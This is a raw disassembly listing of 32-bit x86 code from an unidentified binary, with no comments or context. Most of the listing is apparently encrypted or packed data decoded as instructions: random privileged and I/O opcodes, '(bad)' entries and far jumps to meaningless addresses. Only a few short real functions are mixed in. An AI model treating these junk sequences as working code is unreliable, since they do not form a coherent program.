  403fe4:	mov    bl,BYTE PTR [edi]
  403fe6:	xchg   ebp,eax
  403fe7:	pop    edx
  403fe8:	xor    WORD PTR [ebp+0x1a267c0c],bp
  403fef:	adc    BYTE PTR [esi],0xb3
  403ff2:	sub    DWORD PTR [ebx-0x3b],0xe5fdc313
  403ff9:	je     0x40406a
  403ffb:	jmp    0x404036
  403ffd:	add    edi,ebp
  403fff:	push   cs
  404000:	shr    BYTE PTR [eax+0x52],1
  404003:	outs   dx,DWORD PTR ds:[esi]
  404004:	adc    bl,BYTE PTR ds:[eax+ecx*1+0xe]
  404009:	dec    esp
  40400a:	inc    edi
  40400b:	test   BYTE PTR [edi-0x2f],dh
  40400e:	jg     0x403fda
  404010:	out    0x9a,eax
  404012:	and    bh,BYTE PTR [edi-0x27]
  404015:	push   cs
  404016:	les    edx,FWORD PTR [esi-0x23775461]
  40401c:	sbb    al,cl
  40401e:	push   esp
  40401f:	adc    al,0xd4
  404021:	hlt    
  404022:	or     bh,BYTE PTR [edx+eax*8+0x20]
  404026:	hlt    
  404027:	jo     0x404029
  404029:	shr    BYTE PTR [edx-0x76],0xbe
  40402d:	pop    ebx
  40402e:	sub    dl,BYTE PTR ds:0xfaca
  404033:	test   BYTE PTR [eax],al
  404035:	lsl    esp,bp
  404038:	test   BYTE PTR [edi],dl
  40403a:	xchg   ebx,eax
  40403b:	in     al,dx
  40403c:	addr16 push esi
  40403e:	outs   dx,BYTE PTR ds:[esi]
  40403f:	gs xor eax,0x1d18f114
  404045:	stos   DWORD PTR es:[edi],eax
  404046:	push   ebx
  404047:	dec    esi
  404048:	int3   
  404049:	je     0x4040bd
  40404b:	shl    BYTE PTR [edi-0x7a],1
  40404e:	sub    DWORD PTR [ebp-0x38749c42],ebp
  404054:	out    dx,al
  404055:	mov    edi,0x275a12eb
  40405a:	cmp    bl,BYTE PTR [ebp+0x32]
  40405d:	pop    esi
  40405e:	inc    esp
  40405f:	pusha  
  404060:	jl     0x4040a0
  404062:	mov    eax,0x2d3b5a4b
  404067:	cs jne 0x40409d
  40406a:	sub    edi,DWORD PTR [ecx]
  40406c:	push   0x51
  40406e:	shl    BYTE PTR [ebp+0x7c],0xf6
  404072:	jae    0x4040d7
  404074:	cli    
  404075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404076:	xchg   edi,eax
  404077:	stos   DWORD PTR es:[edi],eax
  404078:	jnp    0x404096
  40407a:	jp     0x4040d8
  40407c:	jle    0x4040df
  40407e:	xor    al,0x28
  404080:	xchg   ebp,eax
  404081:	icebp  
  404082:	idiv   DWORD PTR [edx+eiz*8+0x54b64464]
  404089:	pop    edx
  40408a:	sar    BYTE PTR [ebx+ebx*8],0x24
  40408e:	dec    edx
  40408f:	dec    ebx
  404090:	pop    ds
  404091:	out    dx,al
  404092:	inc    esi
  404093:	cmp    DWORD PTR [ebp+0x6090222c],edi
  404099:	in     eax,0x2c
  40409b:	enter  0x5205,0xb4
  40409f:	fidivr WORD PTR [edx+0x2a]
  4040a2:	push   edx
  4040a3:	dec    esp
  4040a4:	fwait
  4040a5:	pop    esp
  4040a6:	daa    
  4040a7:	inc    ebp
  4040a8:	and    edi,eax
  4040aa:	push   ebp
  4040ab:	mov    DWORD PTR [edi+0x28],eax
  4040ae:	iret   
  4040af:	dec    eax
  4040b0:	ja     0x4040d2
  4040b2:	sbb    bl,BYTE PTR [ebp+0x2a]
  4040b5:	jne    0x40411a
  4040b7:	jne    0x404116
  4040b9:	aas    
  4040ba:	sbb    al,0x8d
  4040bc:	cmp    al,0x81
  4040be:	jne    0x4040b4
  4040c0:	mov    ?,ebp
  4040c2:	add    eax,0x2b7e900
  4040c7:	add    BYTE PTR [eax],al
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0xc9f7e6c1
  4040e3:	sub    eax,0x269ed3f2
  4040e8:	js     0x404162
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x4040d3
  4040ef:	pop    edi
  4040f0:	cmp    al,0x47
  4040f2:	push   esp
  4040f3:	repz push ebx
  4040f5:	loopne 0x4040df
  4040f7:	dec    esi
  4040f8:	dec    eax
  4040f9:	in     eax,0x4a
  4040fb:	jb     0x4040cd
  4040fd:	or     eax,0x8da780a1
  404102:	ror    DWORD PTR [ebx-0x6bc749e4],cl
  404108:	inc    edx
  404109:	clc    
  40410a:	xchg   ecx,eax
  40410b:	lea    edi,[ebp+0x1d]
  40410e:	or     al,0x25
  404110:	add    eax,0x3e7f6ad5
  404115:	call   0xe3f3a34a
  40411a:	outs   dx,BYTE PTR ds:[esi]
  40411b:	xchg   BYTE PTR [ebx+0x9],dh
  40411e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40411f:	pop    edi
  404120:	das    
  404121:	inc    eax
  404122:	fisub  WORD PTR [esi]
  404124:	popa   
  404125:	mov    ecx,DWORD PTR [edx-0x7ed0aaf2]
  40412b:	stos   DWORD PTR es:[edi],eax
  40412c:	dec    esi
  40412d:	or     dl,BYTE PTR [edi-0x16]
  404130:	shl    DWORD PTR [ecx-0x72],cl
  404133:	push   ds
  404134:	jbe    0x404190
  404136:	add    edx,edi
  404138:	out    0x4d,eax
  40413a:	mov    bl,0x3f
  40413c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40413d:	push   ds
  40413e:	lock fwait
  404140:	push   cs
  404141:	pusha  
  404142:	pop    esi
  404143:	retf   
  404144:	call   0x6e957825
  404149:	pop    eax
  40414a:	int3   
  40414b:	sbb    ch,bh
  40414d:	pop    ecx
  40414e:	test   al,0x3b
  404150:	pop    ds
  404151:	ret    
  404152:	or     ecx,ebp
  404154:	ret    0xb4f2
  404157:	dec    eax
  404158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404159:	stos   BYTE PTR es:[edi],al
  40415a:	xlat   BYTE PTR ds:[ebx]
  40415b:	mov    WORD PTR [edi+0x5],cs
  40415e:	shl    ah,0xe
  404161:	xchg   ebx,eax
  404162:	in     eax,0x82
  404164:	or     ebx,DWORD PTR [esp+ecx*4]
  404167:	je     0x4040f7
  404169:	(bad)  
  40416b:	jecxz  0x4041c1
  40416d:	mov    ds:0xb1f9fd69,al
  404172:	mov    ebx,0x4f31b91f
  404177:	xchg   BYTE PTR [eax-0x4e],bl
  40417a:	adc    al,0xfb
  40417c:	sbb    BYTE PTR [edi-0x6d82a93d],0xdf
  404183:	stos   BYTE PTR es:[edi],al
  404184:	(bad)
  404188:	mov    DWORD PTR es:[edx+0x75],edx
  40418c:	dec    esi
  40418d:	ja     0x404187
  40418f:	je     0x4041db
  404191:	xchg   esi,eax
  404192:	das    
  404193:	(bad)  
  404194:	ja     0x40419d
  404196:	ja     0x404212
  404198:	mov    WORD PTR [ecx+0x56d18d92],ss
  40419e:	(bad)  
  40419f:	in     eax,0x13
  4041a1:	pop    ebx
  4041a2:	add    bh,BYTE PTR [edi-0x434b760c]
  4041a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041a9:	cmp    DWORD PTR [edx+edx*1],edx
  4041ac:	dec    eax
  4041ad:	xchg   edi,eax
  4041ae:	adc    edx,ecx
  4041b0:	shl    BYTE PTR [esi],1
  4041b2:	inc    edi
  4041b3:	pop    ecx
  4041b4:	or     eax,0x74bf134f
  4041b9:	and    al,0x7f
  4041bb:	std    
  4041bc:	lahf   
  4041bd:	(bad)  
  4041bf:	jmp    0x3ca0:0x4727fc0
  4041c6:	es jmp 0xabad:0xc78556a0
  4041ce:	jge    0x4041bc
  4041d0:	sub    DWORD PTR [esp+eiz*8+0x20],edi
  4041d4:	sub    al,0x72
  4041d6:	jbe    0x404253
  4041d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041d9:	in     al,dx
  4041da:	pop    ds
  4041db:	push   es
  4041dc:	fdivr  QWORD PTR [ecx+0x7]
  4041df:	push   edx
  4041e0:	sub    ebp,DWORD PTR [esi+0x14]
  4041e3:	pop    ebp
  4041e4:	fadd   st(6),st
  4041e6:	dec    edx
  4041e7:	or     al,0xe9
  4041e9:	fdiv   DWORD PTR [eax-0x5a40f692]
  4041ef:	cmp    bh,BYTE PTR [eax+0x5de49187]
  4041f5:	cmp    edi,DWORD PTR [ebp-0x75]
  4041f8:	and    DWORD PTR [ebp-0x6097aee2],esp
  4041fe:	xor    DWORD PTR [ecx-0x74615fa3],edi
  404204:	ss xchg esi,eax
  404206:	std    
  404207:	and    DWORD PTR [eax+0x56],0x19bfc755
  40420e:	outs   dx,BYTE PTR ds:[esi]
  40420f:	xlat   BYTE PTR ds:[ebx]
  404210:	jne    0x404232
  404212:	pusha  
  404213:	pop    ebx
  404214:	inc    ebx
  404215:	in     al,dx
  404216:	inc    esi
  404217:	sti    
  404218:	inc    esi
  404219:	fld    TBYTE PTR [ebp-0x79b3de5a]
  40421f:	cmp    DWORD PTR [eax+0x1e],eax
  404222:	dec    edx
  404223:	xor    al,0xde
  404225:	mov    edx,0x9dc121b4
  40422a:	push   es
  40422b:	popa   
  40422c:	xor    ch,BYTE PTR [ecx-0x5bbaf76f]
  404232:	es nop
  404234:	add    eax,0x899801c6
  404239:	cwde   
  40423a:	lahf   
  40423b:	adc    al,0xd0
  40423d:	mov    DWORD PTR [ecx-0x5205e5e5],esp
  404243:	cli    
  404244:	stos   BYTE PTR es:[edi],al
  404245:	mov    edx,DWORD PTR [ebp+0x54392487]
  40424b:	inc    esp
  40424c:	pushf  
  40424d:	mov    eax,ds:0xe1217d7b
  404252:	sbb    al,0xe5
  404254:	das    
  404255:	fiadd  DWORD PTR [ebx+edx*2-0x61d1dbbe]
  40425c:	mov    ch,0xe7
  40425e:	add    BYTE PTR [esi+0x720d46c6],bh
  404264:	mov    BYTE PTR [edi-0x42],dh
  404267:	mov    ch,0xc3
  404269:	cwde   
  40426a:	cmp    BYTE PTR [ebx-0x4ec7ec00],cl
  404270:	and    ch,BYTE PTR [edx+ecx*8+0x5dfc6aa0]
  404277:	jl     0x404201
  404279:	cmp    DWORD PTR [ebp-0x49],0xffffffbd
  40427d:	and    dh,al
  40427f:	loope  0x4042d0
  404281:	aas    
  404282:	and    al,BYTE PTR [ebx-0x1f]
  404285:	stos   DWORD PTR es:[edi],eax
  404286:	xor    eax,0x247ed7d
  40428b:	push   ss
  40428c:	das    
  40428d:	imul   esp,DWORD PTR [ebx+0x2d431630],0x32c23398
  404297:	lods   eax,DWORD PTR ds:[esi]
  404298:	cld    
  404299:	(bad)  
  40429a:	arpl   WORD PTR [edx+0x7eb5ac23],ax
  4042a0:	pop    ss
  4042a1:	push   ecx
  4042a2:	jb     0x404256
  4042a4:	xchg   ebx,eax
  4042a5:	lods   al,BYTE PTR ds:[esi]
  4042a6:	dec    esp
  4042a7:	or     BYTE PTR [edx+0x32c7f3f8],0x39
  4042ae:	mov    ah,0x5f
  4042b0:	pop    es
  4042b1:	outs   dx,WORD PTR ds:[esi]
  4042b3:	and    al,0x7f
  4042b5:	and    eax,0xe80e886b
  4042ba:	ins    BYTE PTR es:[edi],dx
  4042bb:	cdq    
  4042bc:	mov    ds:0x746a41ce,eax
  4042c1:	mov    bh,0x30
  4042c3:	and    al,0xd
  4042c5:	pop    ecx
  4042c6:	xchg   esi,eax
  4042c7:	cwde   
  4042c8:	sub    al,0x70
  4042ca:	cs ss pop ds
  4042cd:	pop    esp
  4042ce:	stos   DWORD PTR es:[edi],eax
  4042cf:	ins    DWORD PTR es:[edi],dx
  4042d0:	pop    ecx
  4042d1:	jne    0x4042c8
  4042d3:	or     DWORD PTR [ecx+0xa],ebp
  4042d6:	dec    esp
  4042d7:	sbb    al,0xe2
  4042d9:	mov    dl,0x8c
  4042db:	mov    bh,0x34
  4042dd:	jno    0x404323
  4042df:	fisub  DWORD PTR [edx+ecx*4+0x26]
  4042e3:	ds push esi
  4042e5:	ss xchg ebp,eax
  4042e7:	clc    
  4042e8:	dec    edi
  4042e9:	imul   esi,DWORD PTR [ebx],0xffffff99
  4042ec:	(bad)  
  4042ee:	fisubr DWORD PTR [ebx-0x27]
  4042f1:	js     0x4042b5
  4042f3:	stos   DWORD PTR es:[edi],eax
  4042f4:	jge    0x4042a3
  4042f6:	or     al,0xcf
  4042f8:	int3   
  4042f9:	loopne 0x404294
  4042fb:	mov    esp,0x4ee46dee
  404300:	popa   
  404301:	jae    0x404301
  404303:	xlat   BYTE PTR ds:[ebx]
  404304:	leave  
  404305:	pop    edi
  404306:	lods   al,BYTE PTR ds:[esi]
  404307:	or     BYTE PTR [edi],dl
  404309:	(bad)  
  40430a:	push   edi
  40430b:	add    esp,DWORD PTR [edx-0x48]
  40430e:	jmp    0xb264:0x70b5e226
  404315:	sub    ch,BYTE PTR [edi+0x4d4a30b5]
  40431b:	into   
  40431c:	aaa    
  40431d:	and    eax,0xf1675fe4
  404322:	dec    ebp
  404323:	mov    dh,0x1f
  404325:	and    ecx,DWORD PTR [ebp+0x18]
  404328:	(bad)  
  404329:	ret    
  40432a:	out    dx,al
  40432b:	(bad)  
  40432c:	sbb    BYTE PTR [ebx-0x42],ch
  40432f:	fnstenvw [ebp-0x7d0a2094]
  404336:	pop    es
  404337:	sub    BYTE PTR [ecx-0x2524a1c2],0x44
  40433e:	or     DWORD PTR [esi+0x6240d577],0x4db8e71b
  404348:	mov    ch,dl
  40434a:	mov    bl,0xd6
  40434c:	jmp    0x8604:0xcdc217ab
  404353:	pop    edx
  404354:	hlt    
  404355:	out    0xa3,al
  404357:	nop
  404358:	pop    esp
  404359:	pushf  
  40435a:	outs   dx,BYTE PTR ds:[esi]
  40435b:	pop    ds
  40435c:	mov    al,ds:0x20ac8cba
  404361:	cdq    
  404362:	ret    
  404363:	push   es
  404364:	or     WORD PTR [edx-0x5691581a],dx
  40436b:	mov    cl,0x6c
  40436d:	ss push edx
  40436f:	retf   
  404370:	mov    DWORD PTR [eax],ecx
  404372:	mov    eax,DWORD PTR [ebp+0xc]
  404375:	mov    eax,DWORD PTR [ebp+0x8]
  404378:	push   DWORD PTR [ebp-0x8]
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a77d
  4043aa:	add    DWORD PTR ds:0x42a761,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7b5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7b5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7b5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7b5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7b5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a845
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	push   esi
  40441a:	das    
  40441b:	ret    
  40441c:	(bad)  
  40441d:	sbb    al,0x2b
  40441f:	js     0x404499
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x404436
  404426:	push   cs
  404427:	std    
  404428:	ins    BYTE PTR es:[edi],dx
  404429:	es dec esi
  40442b:	or     ebx,DWORD PTR [ecx+0x33]
  40442e:	cmc    
  40442f:	jecxz  0x404499
  404431:	jmp    0x5587f90
  404436:	cmp    BYTE PTR [eax],bl
  404438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404439:	fisttp QWORD PTR [esi-0x68beb9ef]
  40443f:	jo     0x404485
  404441:	(bad)  [ecx+0x724f2967]
  404447:	in     eax,0xbd
  404449:	and    dl,BYTE PTR [edx-0x3c]
  40444c:	mov    al,ds:0x4c112cb3
  404451:	and    esp,DWORD PTR [edi]
  404453:	mov    ebx,DWORD PTR [esi+ebx*2-0x66]
  404457:	imul   esi,esi,0xbf339a17
  40445d:	sub    edi,edi
  40445f:	inc    esp
  404460:	shr    ch,cl
  404462:	or     ebp,eax
  404464:	(bad)  
  404465:	std    
  404466:	in     al,dx
  404467:	xchg   esp,eax
  404468:	sub    ah,BYTE PTR [esi+0x43]
  40446b:	popa   
  40446c:	mov    esi,0x18d2db3f
  404471:	xchg   BYTE PTR [ecx],dl
  404473:	mov    edx,DWORD PTR [esi+0x40]
  404476:	(bad)  
  404477:	push   ss
  404478:	lea    esp,[ebx+0x44c71306]
  40447e:	inc    esp
  40447f:	or     eax,0x37c9f85c
  404484:	stos   BYTE PTR es:[edi],al
  404485:	in     al,0x97
  404487:	push   0x3a253154
  40448c:	ja     0x404470
  40448e:	or     eax,0xb7c647f6
  404493:	mov    ah,BYTE PTR [esi-0x6b]
  404496:	hlt    
  404497:	ins    DWORD PTR es:[edi],dx
  404498:	test   al,0xe4
  40449a:	push   eax
  40449b:	sti    
  40449c:	and    al,0xd8
  40449e:	or     dl,BYTE PTR [esi]
  4044a0:	pop    es
  4044a1:	jns    0x404494
  4044a3:	in     eax,0x35
  4044a5:	add    eax,0x788358f7
  4044aa:	xor    cl,cl
  4044ac:	jo     0x404468
  4044ae:	xchg   DWORD PTR [edx-0x63],esp
  4044b1:	lds    ebx,FWORD PTR [ebp+0x4bb39426]
  4044b7:	test   ebp,ebp
  4044b9:	inc    esp
  4044ba:	and    bl,BYTE PTR [esi+0x8]
  4044bd:	push   ds
  4044be:	test   al,0xd6
  4044c0:	sahf   
  4044c1:	jns    0x4044f2
  4044c3:	mov    cl,0x7f
  4044c5:	push   0x32
  4044c7:	(bad)  
  4044c8:	sbb    bh,BYTE PTR [ecx-0x2e6cd35d]
  4044ce:	jle    0x40451d
  4044d0:	faddp  st(7),st
  4044d2:	jge    0x4044f1
  4044d4:	push   eax
  4044d5:	and    DWORD PTR [edx],esi
  4044d7:	cdq    
  4044d8:	xor    edi,DWORD PTR [ebx]
  4044da:	pop    es
  4044db:	in     eax,dx
  4044dc:	scas   al,BYTE PTR es:[edi]
  4044dd:	dec    ebx
  4044de:	je     0x4044bf
  4044e0:	lahf   
  4044e1:	adc    eax,0x7fa40e72
  4044e6:	mov    BYTE PTR [ebx+eiz*2],ah
  4044e9:	dec    edi
  4044ea:	and    eax,0x38
  4044ed:	xchg   esi,eax
  4044ee:	pop    edi
  4044ef:	imul   esp,DWORD PTR [edi-0x21],0x2e536351
  4044f6:	test   eax,0x46c64239
  4044fb:	cmp    eax,0x8d42670a
  404500:	dec    ebx
  404501:	xor    bh,BYTE PTR [edi+0x32]
  404504:	cli    
  404505:	stc    
  404506:	(bad)  
  404507:	xchg   esi,eax
  404508:	stos   DWORD PTR es:[edi],eax
  404509:	xchg   edx,eax
  40450a:	retf   
  40450b:	ror    BYTE PTR [esi],cl
  40450d:	push   es
  40450e:	(bad)  
  40450f:	ror    eax,1
  404511:	adc    edx,0x14
  404514:	xchg   ebp,eax
  404515:	cmp    eax,0xfa186d91
  40451a:	lds    ebx,FWORD PTR [ebx+eax*1-0x62c3889e]
  404521:	lock or ebp,ebp
  404524:	jmp    0x6deb3ce2
  404529:	nop
  40452a:	pop    edx
  40452b:	(bad)  
  40452c:	call   0x4e5853b6
  404531:	mov    ds:0xcb8a054a,eax
  404536:	cmp    DWORD PTR [ebx-0x27],ebp
  404539:	into   
  40453a:	dec    eax
  40453b:	push   esi
  40453c:	pop    es
  40453d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40453e:	mov    al,0x91
  404540:	clc    
  404541:	aas    
  404542:	sbb    edx,DWORD PTR [edi+0x69807628]
  404548:	add    ch,BYTE PTR [ebp+0x26]
  40454b:	hlt    
  40454c:	ds cmp al,cl
  40454f:	(bad)  
  404551:	push   edi
  404552:	repz je 0x4045b6
  404555:	(bad)  
  404557:	sub    al,0x34
  404559:	in     eax,dx
  40455a:	shl    edx,1
  40455c:	test   eax,0x9a746964
  404561:	xchg   esp,eax
  404562:	jg     0x404559
  404564:	stos   DWORD PTR es:[edi],eax
  404565:	fbld   TBYTE PTR [ebx]
  404567:	(bad)  
  404568:	jge    0x404544
  40456a:	hlt    
  40456b:	into   
  40456c:	in     eax,0x78
  40456e:	sahf   
  40456f:	dec    edi
  404570:	jne    0x404500
  404572:	ja     0x4044f6
  404574:	lods   al,BYTE PTR ds:[esi]
  404575:	mov    esi,0x2ef0ccd8
  40457a:	pop    es
  40457b:	ds pop esp
  40457d:	ret    0x67bd
  404580:	push   esp
  404581:	jno    0x4045f6
  404583:	test   eax,0xe6c4b1cd
  404588:	loop   0x4045e9
  40458a:	inc    esp
  40458b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40458c:	ja     0x404560
  40458e:	retf   0xad
  404591:	jns    0x40459c
  404593:	les    esp,FWORD PTR [edx-0x3]
  404596:	mov    ebp,0xd4748aa3
  40459b:	jecxz  0x404611
  40459d:	fldcw  WORD PTR [edx+0x35]
  4045a0:	inc    esi
  4045a1:	aam    0x15
  4045a3:	fcmovbe st,st(3)
  4045a5:	mov    ah,0x40
  4045a7:	sahf   
  4045a8:	popa   
  4045a9:	sbb    al,0x26
  4045ab:	test   al,0xf7
  4045ad:	dec    eax
  4045ae:	mov    al,0xc3
  4045b0:	leave  
  4045b1:	push   ds
  4045b2:	lahf   
  4045b3:	popa   
  4045b4:	pop    esp
  4045b5:	adc    DWORD PTR [eax+esi*8+0x2],esp
  4045b9:	jmp    0x2b05:0x202e79b3
  4045c0:	fdivr  DWORD PTR [edi]
  4045c2:	(bad)  
  4045c3:	sub    eax,0x5c3881c7
  4045c8:	cmp    ah,dl
  4045ca:	and    eax,0xd1856e5
  4045cf:	loopne 0x404551
  4045d1:	xchg   esi,eax
  4045d2:	mov    dh,0x1
  4045d4:	into   
  4045d5:	loop   0x4045f4
  4045d7:	sbb    ch,BYTE PTR [ecx-0xd]
  4045da:	pop    edi
  4045db:	pop    ebx
  4045dc:	pop    ebx
  4045dd:	push   edx
  4045de:	stos   DWORD PTR es:[edi],eax
  4045df:	lds    eax,FWORD PTR fs:[bx+di-0x30]
  4045e4:	cdq    
  4045e5:	mov    bl,0xbf
  4045e7:	sub    edi,edx
  4045e9:	into   
  4045ea:	xchg   esp,eax
  4045eb:	sub    eax,0xf4a559
  4045f0:	cld    
  4045f1:	dec    ebx
  4045f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045f3:	cdq    
  4045f4:	(bad)  
  4045f6:	push   ebx
  4045f7:	ja     0x4045e6
  4045f9:	jge    0x40457e
  4045fb:	pop    es
  4045fc:	lods   al,BYTE PTR ds:[esi]
  4045fd:	cli    
  4045fe:	mov    WORD PTR [esi],gs
  404600:	or     eax,0x9280539b
  404605:	int3   
  404606:	jmp    0xb5b7:0x1978a7aa
  40460d:	mov    cl,0x12
  40460f:	xchg   edx,eax
  404610:	mov    ebx,0x390bd120
  404615:	clc    
  404616:	sub    al,0xb8
  404618:	or     BYTE PTR [ecx-0x7a1b3577],ah
  40461e:	dec    ebp
  40461f:	outs   dx,DWORD PTR ds:[esi]
  404620:	lahf   
  404621:	and    DWORD PTR [esi+0x0],ebp
  404624:	imul   esp,edi,0xffffffb4
  404627:	xor    BYTE PTR [ecx-0x76657934],ah
  40462d:	add    eax,0x5f3d4e2c
  404632:	dec    esp
  404633:	xchg   esi,eax
  404634:	sub    ah,BYTE PTR [edi+0x13999aca]
  40463a:	pop    esp
  40463b:	test   esp,edx
  40463d:	dec    ebx
  40463e:	dec    edi
  40463f:	cmp    BYTE PTR [ebx-0x1d],ch
  404642:	cmp    esp,DWORD PTR [edi+0x50e2f026]
  404648:	push   ebx
  404649:	sub    al,0x2b
  40464b:	pop    ecx
  40464c:	fiadd  DWORD PTR [eax]
  40464e:	mov    ds:0x1eeb5a7,eax
  404653:	or     bl,BYTE PTR [eax-0x7d93e1fd]
  404659:	xor    al,0x52
  40465b:	xor    al,0xc4
  40465d:	out    dx,eax
  40465e:	dec    esi
  40465f:	sub    ah,BYTE PTR [esi-0x28]
  404662:	pop    ebp
  404663:	pushf  
  404664:	mov    eax,0xca089e43
  404669:	adc    ebp,DWORD PTR [edx]
  40466b:	xor    BYTE PTR [eax+0x17],al
  40466e:	and    al,0x2b
  404670:	inc    esi
  404671:	je     0x4046b0
  404673:	(bad)  
  404674:	pop    ds
  404675:	xchg   esp,eax
  404676:	and    DWORD PTR [ebx+0x52d705ee],0x66
  40467d:	imul   BYTE PTR [esp+esi*8]
  404680:	(bad)  
  404682:	xor    eax,0x1fe05cb5
  404687:	ficomp DWORD PTR [ebx-0x71]
  40468a:	pop    ecx
  40468b:	add    BYTE PTR [esi+eiz*8+0x36035775],0xcf
  404693:	mov    bh,0xbe
  404695:	mov    sp,0x3a54
  404699:	shl    cl,1
  40469b:	push   ds
  40469c:	je     0x4046a7
  40469e:	xchg   edi,eax
  40469f:	dec    DWORD PTR [ecx]
  4046a1:	jg     0x4046fc
  4046a3:	rcl    DWORD PTR ds:0xed1f1ed2,1
  4046a9:	xchg   esp,eax
  4046aa:	cmp    DWORD PTR [eax-0x1d27f8ce],edx
  4046b0:	sub    cl,BYTE PTR [edi]
  4046b2:	and    al,0x65
  4046b4:	mov    eax,ds:0xca81cf79
  4046b9:	sub    dh,BYTE PTR [edx]
  4046bb:	fsubr  QWORD PTR [ebx]
  4046bd:	call   0x10733377
  4046c2:	mov    ecx,0xa142c4d5
  4046c7:	out    0x2e,al
  4046c9:	lds    eax,FWORD PTR [ebp-0x312077eb]
  4046cf:	mov    ecx,0x55ca0c9c
  4046d4:	popa   
  4046d5:	in     eax,dx
  4046d6:	in     al,0xac
  4046d8:	mov    ebx,DWORD PTR [ecx+ebp*1-0x6f]
  4046dc:	pop    esi
  4046dd:	lahf   
  4046de:	mov    edi,0xa8f438a2
  4046e3:	rcr    bh,cl
  4046e5:	mov    ds:0x9d59f68e,eax
  4046ea:	add    edi,DWORD PTR [ecx-0x23]
  4046ed:	xchg   edi,ebp
  4046ef:	es mov dh,0x3a
  4046f2:	cmp    BYTE PTR [eax+0x61ecf684],bh
  4046f8:	push   esi
  4046f9:	and    DWORD PTR ds:0x42a775,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a775
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a775,esi
  404715:	cmp    DWORD PTR ds:0x42a775,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a775,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a83d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa48
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x854783de
  404770:	xor    al,0x9c
  404772:	jno    0x40479d
  404774:	js     0x4047ee
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x404776
  40477b:	mov    ah,0xe9
  40477d:	sub    eax,0xcfff3971
  404782:	xchg   ebx,eax
  404783:	leave  
  404784:	pop    ebp
  404785:	scas   al,BYTE PTR es:[edi]
  404786:	pop    eax
  404787:	sbb    cl,al
  404789:	cmp    BYTE PTR [edi-0x68],ah
  40478c:	popa   
  40478d:	fdiv   DWORD PTR [ebp-0x22]
  404790:	shr    dl,1
  404792:	loopne 0x40475d
  404794:	sbb    edi,0x8d84bd6c
  40479a:	iret   
  40479b:	mov    eax,ds:0x56215e37
  4047a0:	dec    ebp
  4047a1:	pusha  
  4047a2:	stos   WORD PTR es:[edi],ax
  4047a4:	aad    0x1b
  4047a6:	jmp    0x308009a2
  4047ab:	dec    ebx
  4047ac:	and    ch,BYTE PTR cs:[ebx]
  4047af:	mov    WORD PTR cs:[edx-0x2e],ss
  4047b3:	mov    ss,WORD PTR [ebx]
  4047b5:	not    BYTE PTR [eax+0x7cd0d641]
  4047bb:	hlt    
  4047bc:	jo     0x40475a
  4047be:	or     DWORD PTR [ebx+0x1135f3c7],edi
  4047c4:	sub    DWORD PTR [ebx+0x8],0xffffffe7
  4047c8:	stos   BYTE PTR es:[edi],al
  4047c9:	push   eax
  4047ca:	nop
  4047cb:	in     al,0x22
  4047cd:	mov    eax,ds:0x909f5289
  4047d2:	loope  0x40481d
  4047d4:	jecxz  0x4047e7
  4047d6:	pop    DWORD PTR [ecx]
